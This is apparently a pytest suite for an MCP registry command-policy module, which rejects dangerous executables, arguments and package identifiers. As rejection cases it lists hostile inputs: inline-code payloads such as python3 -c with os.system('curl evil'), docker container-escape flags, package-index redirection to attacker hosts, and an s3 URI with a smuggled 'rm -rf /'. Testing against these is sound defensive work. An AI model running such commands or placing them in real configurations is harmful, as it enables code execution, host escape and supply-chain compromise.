"""
ASR SC-01 / SC-02 — registry-supplied executable and argv policy.

The MCP registry API response is not a trust boundary. Two sinks consume the
executable it names:

  * **install sink** -- ``subprocess.run([executable] + args)`` at install time
  * **run sink** -- ``config_entries['command']``, persisted into
    ``~/.ziya/mcp_config.json`` and re-executed on EVERY subsequent server
    start (i.e. *persistent* code execution)

Before SC-01/SC-02 the run sink was completely unconstrained in all four
providers, and the install sink allowlisted argv[0] only -- leaving the args
free to redirect an allowlisted installer at an attacker-controlled index.

Every assertion here is on a behaviour that did not exist before the fix:
``validate_run_command`` / ``validate_install_argv`` are new, so the whole
module fails to import against unpatched code.
"""

import os
from pathlib import Path

import pytest

from app.mcp.registry.command_policy import (
    ALLOWED_RUN_EXECUTABLES,
    DEFAULT_INSTALL_EXECUTABLES,
    RegistryCommandRejected,
    validate_install_argv,
    validate_package_identifier,
    validate_run_command,
)

SRC = "test-suite:svc"


@pytest.fixture(autouse=True)
def isolated_toolbox_root(tmp_path, monkeypatch):
    """Point the BuilderToolbox exemption at an empty tmp tree.

    ``validate_run_command`` accepts any executable that resolves to a real
    file under ``~/.toolbox/bin`` (the toolbox-vended slice of the internal
    registry names its run command as a bare tool name). Without this fixture
    the outcome depends on what the developer happens to have installed --
    ``mcp-registry`` and ``aim`` are present on an Amazon laptop and absent on
    CI, so the same assertion would be green in one place and red in the other.
    Isolate it so every case here is deterministic; the exemption itself is
    covered explicitly in TestToolboxRunExemption.
    """
    root = tmp_path / "toolbox-root" / ".toolbox"
    (root / "bin").mkdir(parents=True)
    monkeypatch.setattr(
        "app.mcp.registry.command_policy._toolbox_root", lambda: root
    )
    return root


# ---------------------------------------------------------------------------
# Run sink -- argv[0] policy (SC-01)
# ---------------------------------------------------------------------------

class TestRunExecutableAllowlist:
    @pytest.mark.parametrize("launcher", sorted(ALLOWED_RUN_EXECUTABLES))
    def test_allowlisted_bare_launcher_accepted(self, launcher):
        """Every name in the declared allowlist really is accepted.

        Pairs with the rejection cases below so a bug that rejects everything
        cannot pass this file.
        """
        assert validate_run_command(launcher, source=SRC) == [launcher]

    @pytest.mark.parametrize("payload", [
        "/bin/sh",
        "/bin/bash",
        "bash",
        "sh",
        "zsh",
        "/usr/bin/env",
        "curl",
        "osascript",
    ])
    def test_shell_and_arbitrary_executor_rejected(self, payload):
        with pytest.raises(RegistryCommandRejected):
            validate_run_command(payload, source=SRC)

    def test_relative_path_with_allowlisted_basename_rejected(self):
        """``../../tmp/evil/npx`` must not pass on basename alone.

        The manager hands this value to subprocess verbatim, resolved against
        Ziya's cwd at every server start -- so a relative path is attacker
        controlled placement, not a launcher.
        """
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("../../tmp/evil/npx", source=SRC)
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("./npx", source=SRC)

    def test_absolute_path_outside_install_dir_rejected(self, tmp_path):
        install_dir = tmp_path / "svc"
        install_dir.mkdir()
        with pytest.raises(RegistryCommandRejected):
            validate_run_command(
                "/tmp/evil/server.py", source=SRC, install_dir=install_dir
            )

    def test_absolute_path_inside_install_dir_accepted(self, tmp_path):
        install_dir = tmp_path / "svc"
        install_dir.mkdir()
        entry = install_dir / "server.py"
        entry.write_text("# entrypoint\n")
        assert validate_run_command(
            str(entry), source=SRC, install_dir=install_dir
        ) == [str(entry)]

    def test_symlink_escaping_install_dir_rejected(self, tmp_path):
        """Containment is checked on the realpath, so a planted symlink that
        points out of the install tree does not launder the path."""
        install_dir = tmp_path / "svc"
        install_dir.mkdir()
        outside = tmp_path / "outside.py"
        outside.write_text("# attacker payload\n")
        link = install_dir / "server.py"
        link.symlink_to(outside)
        with pytest.raises(RegistryCommandRejected):
            validate_run_command(
                str(link), source=SRC, install_dir=install_dir
            )

    def test_no_install_dir_means_no_absolute_path_escape(self):
        """A provider that does not pass install_dir gets no path exemption."""
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("/usr/local/bin/npx", source=SRC)

    def test_extra_executables_widens_only_for_that_call(self):
        """The internal plugin's toolbox/aim launchers are opt-in per call and
        must not leak into the shared default allowlist."""
        assert validate_run_command(
            "mcp-registry", source=SRC,
            extra_executables=frozenset({"mcp-registry"}),
        ) == ["mcp-registry"]
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("mcp-registry", source=SRC)

    @pytest.mark.parametrize("bad", [None, "", "   ", []])
    def test_empty_or_missing_command_rejected(self, bad):
        with pytest.raises(RegistryCommandRejected):
            validate_run_command(bad, source=SRC)

    def test_list_command_normalized_and_preserved(self):
        assert validate_run_command(
            ["npx", "-y", "some-mcp-server"], source=SRC
        ) == ["npx", "-y", "some-mcp-server"]


# ---------------------------------------------------------------------------
# Run sink -- argv TAIL policy (the inline-code half)
# ---------------------------------------------------------------------------

class TestRunArgCodeExecution:
    """An allowlisted launcher plus an inline-code flag is still durable RCE.

    ``python3`` is a legitimate launcher, but ``python3 -c <payload>``
    persisted as the run command executes the payload on every server start.
    """

    @pytest.mark.parametrize("argv", [
        ["python3", "-c", "import os; os.system('curl evil')"],
        ["python", "-c", "print(1)"],
        ["node", "-e", "require('child_process').exec('x')"],
        ["node", "--eval", "1"],
        ["node", "-p", "1"],
        ["node", "--print", "1"],
    ])
    def test_inline_code_flag_in_command_array_rejected(self, argv):
        """Filtered whether the tail arrives inside command_array ...

        official-mcp / github pass registry ``instructions.command`` through
        verbatim, so the tail must be filtered there too -- not only when it
        arrives via the ``args=`` keyword.
        """
        with pytest.raises(RegistryCommandRejected):
            validate_run_command(argv, source=SRC)

    def test_inline_code_flag_via_args_kwarg_rejected(self):
        """... or via the args= keyword (the internal plugin's shape)."""
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("python3", source=SRC, args=["-c", "evil()"])

    def test_equals_form_of_denied_flag_rejected(self):
        with pytest.raises(RegistryCommandRejected):
            validate_run_command(["node", "--eval=evil()"], source=SRC)

    @pytest.mark.parametrize("argv", [
        ["docker", "run", "-v", "/:/host", "img"],
        ["docker", "run", "--volume", "/:/host", "img"],
        ["docker", "run", "--privileged", "img"],
        ["docker", "run", "--mount", "type=bind,src=/,dst=/host", "img"],
        ["docker", "run", "--device", "/dev/kmsg", "img"],
        ["docker", "run", "--cap-add", "SYS_ADMIN", "img"],
        ["docker", "run", "--pid", "host", "img"],
        ["docker", "run", "--userns", "host", "img"],
        ["docker", "run", "--network", "host", "img"],
    ])
    def test_docker_container_escape_flags_rejected(self, argv):
        with pytest.raises(RegistryCommandRejected):
            validate_run_command(argv, source=SRC)

    def test_benign_docker_run_still_accepted(self):
        """The argv InstallationHelper actually builds must survive."""
        argv = ["docker", "run", "-i", "--rm", "some/image:1.0"]
        assert validate_run_command(argv, source=SRC) == argv

    @pytest.mark.parametrize("argv", [
        # Run args legitimately carry URLs and absolute paths; the install-side
        # "://" and absolute-path rules must NOT be applied here.
        ["npx", "mcp-remote", "https://example.com/mcp"],
        ["uvx", "--from", "git+https://example.com/x.git", "srv"],
        ["python3", "/abs/path/server.py"],
        ["python3", "-m", "some_module"],
        ["python3", "-u", "server.py"],
        ["npx", "-y", "pkg"],
    ])
    def test_legitimate_run_args_not_over_blocked(self, argv):
        assert validate_run_command(argv, source=SRC) == argv

    def test_non_string_run_arg_rejected(self):
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("npx", source=SRC, args=[{"evil": True}])


# ---------------------------------------------------------------------------
# Install sink (SC-02 / C-2)
# ---------------------------------------------------------------------------

class TestInstallExecutableAllowlist:
    @pytest.mark.parametrize("installer", sorted(DEFAULT_INSTALL_EXECUTABLES))
    def test_allowlisted_installer_accepted(self, installer):
        assert validate_install_argv(installer, ["pkg"], source=SRC) == [
            installer, "pkg",
        ]

    @pytest.mark.parametrize("payload", ["/bin/sh", "bash", "curl", "make"])
    def test_non_package_manager_rejected(self, payload):
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv(payload, ["x"], source=SRC)

    @pytest.mark.parametrize("payload", [
        "/tmp/evil/pip",
        "/usr/local/bin/pip",
        "../../evil/pip",
        "./npm",
    ])
    def test_path_qualified_installer_rejected(self, payload):
        """The allowlist must not be satisfiable by basename alone.

        ``subprocess`` receives the value verbatim, so ``/tmp/evil/pip``
        passing a check on ``pip`` executes the attacker's binary. The run
        sink already requires a bare name; this is the install sink's half.
        """
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv(payload, ["install", "pkg"], source=SRC)

    def test_returned_argv_is_what_was_allowlisted(self):
        """The executed argv and the audited argv must be the same value."""
        assert validate_install_argv(
            "  pip  ", ["install", "pkg"], source=SRC
        ) == ["pip", "install", "pkg"]

    def test_docker_is_not_an_installer(self):
        """ASR SC-02 decision: ``docker`` was removed from the *install*
        allowlist because a registry-supplied docker argv is not constrainable
        by any flag denylist. It remains a legal *run* launcher, where the argv
        is built by InstallationHelper rather than supplied by the registry."""
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv("docker", ["run", "img"], source=SRC)
        assert "docker" in ALLOWED_RUN_EXECUTABLES
        assert "docker" not in DEFAULT_INSTALL_EXECUTABLES


class TestInstallArgRedirection:
    @pytest.mark.parametrize("flag", [
        "-i", "--index-url", "--extra-index-url", "--find-links", "-f",
        "--trusted-host", "--config-settings", "--target", "--prefix",
        "--root", "--editable", "-e",
    ])
    def test_pip_source_redirection_flags_rejected(self, flag):
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv(
                "pip", ["install", flag, "evil.example.com", "pkg"], source=SRC
            )

    @pytest.mark.parametrize("flag", [
        "--registry", "--userconfig", "--globalconfig", "--prefix",
    ])
    def test_npm_source_redirection_flags_rejected(self, flag):
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv(
                "npm", ["install", flag, "evil", "pkg"], source=SRC
            )

    @pytest.mark.parametrize("flag", [
        "--index-url", "--extra-index-url", "--default-index",
        "--find-links", "--index",
    ])
    def test_uv_source_redirection_flags_rejected(self, flag):
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv("uv", ["pip", "install", flag, "x"], source=SRC)

    def test_equals_form_of_redirect_flag_rejected(self):
        """``--index-url=...`` must be caught, not just the spaced form."""
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv(
                "pip", ["install", "--index-url=http://evil", "pkg"], source=SRC
            )

    @pytest.mark.parametrize("arg", [
        "http://evil.example.com/pkg.whl",
        "https://evil.example.com/pkg.tar.gz",
        "git+ssh://evil.example.com/x.git",
    ])
    def test_url_argument_rejected(self, arg):
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv("pip", ["install", arg], source=SRC)

    def test_absolute_path_argument_rejected(self):
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv(
                "pip", ["install", "/tmp/evil/pkg.whl"], source=SRC
            )

    @pytest.mark.parametrize("bad", [{"a": 1}, ["x"], 7, None])
    def test_non_string_install_arg_rejected(self, bad):
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv("pip", ["install", bad], source=SRC)

    @pytest.mark.parametrize("args", [
        ["install", "some-package"],
        ["install", "some-package==1.2.3"],
        ["install", "some-package[extra]>=2,<3"],
        ["install", "-U", "some-package"],
    ])
    def test_ordinary_pip_install_unaffected(self, args):
        """The constraint set must leave real installs working -- otherwise the
        control gets reverted the first time a legitimate service breaks."""
        assert validate_install_argv("pip", args, source=SRC) == ["pip"] + args

    def test_ordinary_npm_install_unaffected(self):
        args = ["install", "@scope/some-mcp-server"]
        assert validate_install_argv("npm", args, source=SRC) == ["npm"] + args


class TestInstallS3SourceExemption:
    """BuilderToolbox is the only transport for an internal MCP tool, and its
    package spec genuinely is an ``s3://`` URI -- so the blanket "no ://" rule
    is relaxed for that one installer, on a strictly-shaped URI only."""

    TOOLBOX = frozenset(DEFAULT_INSTALL_EXECUTABLES | {"toolbox"})

    def test_shaped_s3_uri_accepted_for_toolbox(self):
        arg = "s3://buildertoolbox-example/tools.json"
        assert validate_install_argv(
            "toolbox", ["registry", "add", arg], source=SRC,
            allowed_executables=self.TOOLBOX,
        ) == ["toolbox", "registry", "add", arg]

    def test_s3_uri_rejected_for_other_installers(self):
        """The exemption is confined to toolbox; pip gets no s3 pass."""
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv(
                "pip", ["install", "s3://bucket/pkg.whl"], source=SRC
            )

    @pytest.mark.parametrize("arg", [
        "s3://bucket/../../etc/passwd",          # traversal in key
        "s3://BUCKET/tools.json",                # uppercase bucket
        "s3://ab/tools.json",                    # bucket too short
        "s3://bucket/tools.json; rm -rf /",      # shell metacharacters
        "s3://-bad/tools.json",                  # bucket must start alnum
        "https://bucket.example.com/tools.json",  # not s3 at all
    ])
    def test_malformed_s3_uri_rejected_even_for_toolbox(self, arg):
        with pytest.raises(RegistryCommandRejected):
            validate_install_argv(
                "toolbox", ["registry", "add", arg], source=SRC,
                allowed_executables=self.TOOLBOX,
            )


class TestToolboxRunExemption:
    """A BuilderToolbox-managed tool is a legal run command.

    This is the shape the toolbox-vended slice of the internal registry uses:
    the run command is the bare name of the tool the install step just
    installed. Acceptance is conditional on the name really resolving to a
    file inside the toolbox tree, which is what keeps ``curl`` / ``bash``
    refused -- they live in /usr/bin, not ~/.toolbox/bin.
    """

    def test_installed_toolbox_tool_accepted_by_bare_name(self, isolated_toolbox_root):
        tool = isolated_toolbox_root / "bin" / "aae-atlas"
        tool.write_text("#!/bin/sh\n")
        assert validate_run_command("aae-atlas", source=SRC) == [str(tool)]

    def test_explicit_toolbox_path_accepted(self, isolated_toolbox_root):
        tool = isolated_toolbox_root / "bin" / "aae-atlas"
        tool.write_text("#!/bin/sh\n")
        assert validate_run_command(str(tool), source=SRC) == [str(tool)]

    def test_uninstalled_name_rejected(self):
        """A name with nothing on disk behind it must not be persisted."""
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("not-installed-tool", source=SRC)

    def test_symlink_out_of_toolbox_tree_rejected(
        self, isolated_toolbox_root, tmp_path
    ):
        outside = tmp_path / "payload.sh"
        outside.write_text("#!/bin/sh\n")
        link = isolated_toolbox_root / "bin" / "sneaky"
        link.symlink_to(outside)
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("sneaky", source=SRC)

    def test_system_binary_not_reachable_via_exemption(self):
        """``curl`` is not in the run allowlist and is not under the toolbox
        tree, so the exemption does not launder it."""
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("curl", source=SRC)

    def test_toolbox_tool_args_still_filtered(self, isolated_toolbox_root):
        """Reaching the toolbox branch must not skip the arg guard."""
        tool = isolated_toolbox_root / "bin" / "python3"
        tool.write_text("#!/bin/sh\n")
        with pytest.raises(RegistryCommandRejected):
            validate_run_command("python3", source=SRC, args=["-c", "evil()"])


class TestRejectionIsRecoverable:
    def test_rejection_is_a_valueerror_subclass(self):
        """Providers wrap install in ``except Exception`` and convert to
        ``InstallationResult(success=False)``. Subclassing ValueError keeps a
        refusal a failed install rather than an unhandled traceback."""
        assert issubclass(RegistryCommandRejected, ValueError)

    def test_message_names_the_source_and_the_value(self):
        """The operator has to be able to tell which registry entry was
        refused and why, from the log line alone."""
        with pytest.raises(RegistryCommandRejected) as exc:
            validate_run_command("/bin/sh", source="official-mcp:acme/tool")
        msg = str(exc.value)
        assert "official-mcp:acme/tool" in msg
        assert "/bin/sh" in msg
        assert "mcp_config.json" in msg


class TestPackageIdentifier:
    """``validate_package_identifier`` — the identifier sink (ASR SC-02).

    ``validate_install_argv`` guards an argv the registry hands us whole. This
    guards the other shape: an argv WE build, into which the registry supplies
    one value — ``['pip','install',<id>]``, ``['npm','install',<id>]``,
    ``['npx','-y',<id>]``, ``['docker','run','-i','--rm',<image>]``. A fixed
    argv[0] is not sufficient there, because both installers accept a *source*
    in the position we treat as a name.
    """

    @pytest.mark.parametrize("ident", [
        "mcp-server-fetch",
        "@modelcontextprotocol/server-filesystem",
        "server-github",
        "pkg==1.2.3",
        "pkg>=1.0,<2.0",
        "pkg[extra]",
        "pkg[extra1,extra2]==3.4",
        "ghcr.io/org/img:tag",
        "mcp/everything",
        "_private_pkg",
        "pkg_with_underscores",
        "Pkg.With.Dots",
        "a",
        "0pkg",
    ])
    def test_legitimate_identifiers_accepted(self, ident):
        """Positive control. If these ever start failing the gate is too tight
        and will be reverted wholesale the first time a real install breaks."""
        assert validate_package_identifier(ident, source=SRC) == ident

    def test_surrounding_whitespace_is_stripped(self):
        assert validate_package_identifier("  pkg==1.0  ", source=SRC) == "pkg==1.0"

    @pytest.mark.parametrize("ident", [
        "pkg @ https://attacker.example/evil.tar.gz",
        "pkg @https://attacker.example/evil.tar.gz",
        "name @ file:///tmp/evil",
        "pkg @ git+ssh://attacker.example/evil",
    ])
    def test_pep508_direct_reference_refused(self, ident):
        """pip honours ``name @ <url>`` as a direct reference, so a value we
        treat as a package NAME can point the install at any origin."""
        with pytest.raises(RegistryCommandRejected):
            validate_package_identifier(ident, source=SRC)

    @pytest.mark.parametrize("ident", [
        "https://attacker.example/evil.tgz",
        "http://attacker.example/evil.tgz",
        "git+https://attacker.example/evil",
        "git+ssh://attacker.example/evil",
        "file:///tmp/evil",
        "pkg@https://attacker.example/evil.tgz",
    ])
    def test_url_or_git_spec_refused(self, ident):
        """npm accepts a bare URL or git spec where a name belongs. On the
        ``npx -y <id>`` path there is no install step at all: the value is
        persisted as the run command and re-fetched on every server start."""
        with pytest.raises(RegistryCommandRejected):
            validate_package_identifier(ident, source=SRC)

    @pytest.mark.parametrize("ident", ["-i", "--index-url", "-e", "--editable"])
    def test_leading_dash_refused(self, ident):
        """A leading '-' lands in a FLAG position of the argv we build, turning
        one value into an installer option."""
        with pytest.raises(RegistryCommandRejected):
            validate_package_identifier(ident, source=SRC)

    @pytest.mark.parametrize("ident", [
        "/tmp/evil", "/etc/passwd", "./evil", ".hidden", "~/evil", "~root/evil",
    ])
    def test_path_shaped_identifier_refused(self, ident):
        """'/', '.' and '~' make the value a filesystem path, and pip installs
        a local path happily."""
        with pytest.raises(RegistryCommandRejected):
            validate_package_identifier(ident, source=SRC)

    @pytest.mark.parametrize("ident", ["../evil", "pkg/../../evil", "a..b"])
    def test_traversal_refused(self, ident):
        with pytest.raises(RegistryCommandRejected):
            validate_package_identifier(ident, source=SRC)

    @pytest.mark.parametrize("ident", [None, "", "   ", 123, 1.5, True,
                                       ["pkg"], {"name": "pkg"}, object()])
    def test_non_string_or_empty_refused(self, ident):
        """A dict or list here is type confusion into subprocess."""
        with pytest.raises(RegistryCommandRejected):
            validate_package_identifier(ident, source=SRC)

    def test_absurdly_long_identifier_refused(self):
        with pytest.raises(RegistryCommandRejected):
            validate_package_identifier("a" * 215, source=SRC)

    def test_at_the_length_limit_accepted(self):
        """Boundary: npm's own published limit is 214, so 214 must pass or the
        gate is refusing names the registry can legally contain."""
        ident = "a" * 214
        assert validate_package_identifier(ident, source=SRC) == ident

    def test_rejection_names_the_source_and_the_value(self):
        """The operator has to be able to tell which entry was refused and why
        from the message alone."""
        with pytest.raises(RegistryCommandRejected) as exc:
            validate_package_identifier(
                "https://attacker.example/x.tgz", source="official-mcp:acme/tool",
            )
        msg = str(exc.value)
        assert "official-mcp:acme/tool" in msg
        assert "attacker.example" in msg

    def test_kind_appears_in_the_message(self):
        """The docker sink passes kind='image'; the message must say so rather
        than calling a container image a 'package'."""
        with pytest.raises(RegistryCommandRejected) as exc:
            validate_package_identifier("-v", source=SRC, kind="image")
        assert "image" in str(exc.value)